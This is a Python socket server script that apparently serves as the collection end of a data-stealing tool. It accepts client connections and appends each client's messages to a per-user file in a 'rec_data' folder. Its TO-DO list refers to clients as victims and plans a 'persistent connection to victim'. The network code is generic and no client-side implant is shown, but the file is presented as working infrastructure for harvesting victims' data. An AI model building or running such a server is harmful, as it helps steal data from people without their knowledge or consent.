#!/usr/bin/env python3
import socket
import select
import threading
from datetime import datetime
import logging

HEADER_LENGTH = 10


'''
TO-DO list:
    - Improve server performance.
    - Add multiple writing threads.
    - Implement persistent connection to victim (now crashes).
    - Improve socket comunication.

'''

class Server:

    def __init__(self, ip, port):
        IP = ip
        PORT = port
        self.writing_thread = None
        logging.basicConfig(
            level=logging.DEBUG,
            format="{asctime} {levelname:<8} {message}",
            style='{',
            filename='%slog' % __file__[:-2],
            filemode='a'
        )
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server_socket.bind((IP, PORT))
        self.sockets_list = [self.server_socket]
        self.clients = {}
        msg = f'\nPython3 Server started on {socket.gethostname()} at {datetime.now().strftime("%H:%M:%S %b-%d-%Y")}.\n\nListening for connections on {IP}:{PORT}...\n\n'
        print(msg)
        self.log_debug(msg)

    def log_debug(self, log):
        logging.debug(log)

    def log_warning(self, log):
        logging.warning(log)

    def parse_text(self, data):
        return data

    def append_text(self, username, data):
        with open(f"rec_data/{username}_data.txt", "a") as file:
            file.write(self.parse_text(data))

    def receive_message(self, client_socket):
        try:
            message_header = client_socket.recv(HEADER_LENGTH)
            if not len(message_header):
                return False
            message_length = int(message_header.decode('utf-8').strip())
            return {'header': message_header, 'data': client_socket.recv(message_length)}
        except Exception:
            return False

    def start(self):
        try:
            self.server_socket.listen()
            while True:
                read_sockets, _, exception_sockets = select.select(self.sockets_list, [], self.sockets_list)
                for notified_socket in read_sockets:
                    if notified_socket == self.server_socket:
                        client_socket, client_address = self.server_socket.accept()
                        user = self.receive_message(client_socket)
                        if user is False:
                            continue
                        self.sockets_list.append(client_socket)
                        self.clients[client_socket] = user
                        username = user['data'].decode('utf-8')
                        address = str(client_address).replace('(', '').replace(')', '').replace(',', ':').replace('\'', '')
                        msg = f'Accepted new connection from {address}, username: {username}'
                        print(msg)
                        self.log_debug(msg)
                    else:
                        message = self.receive_message(notified_socket)
                        if message is False:
                            username = self.clients[notified_socket]['data'].decode('utf-8')
                            log = f"Closed connection from: {username}"
                            print(log)
                            self.log_warning(log)
                            self.sockets_list.remove(notified_socket)
                            del self.clients[notified_socket]
                            continue
                        user = self.clients[notified_socket]
                        username = user["data"].decode("utf-8")
                        msg = message["data"].decode("utf-8")
                        if self.writing_thread!=None:
                            self.writing_thread.join()
                        self.writing_thread = threading.Thread(target=self.append_text, args=(username, msg))
                        self.writing_thread.start()
                        msg = f'Received message from {username}: {msg}'
                        print(msg)
                        self.log_debug(msg)
                        for client_socket in self.clients:
                            if client_socket != notified_socket:
                                client_socket.send(user['header'] + user['data'] + message['header'] + message['data'])
                for notified_socket in exception_sockets:
                    self.sockets_list.remove(notified_socket)
                    del self.clients[notified_socket]
        except KeyboardInterrupt:
            for client_socket in self.sockets_list:
                client_socket.close()
                self.sockets_list.remove(client_socket)
            self.server_socket.close()
            print("\nClosing server...")


server = Server("127.0.0.1", 11234)
server.start()
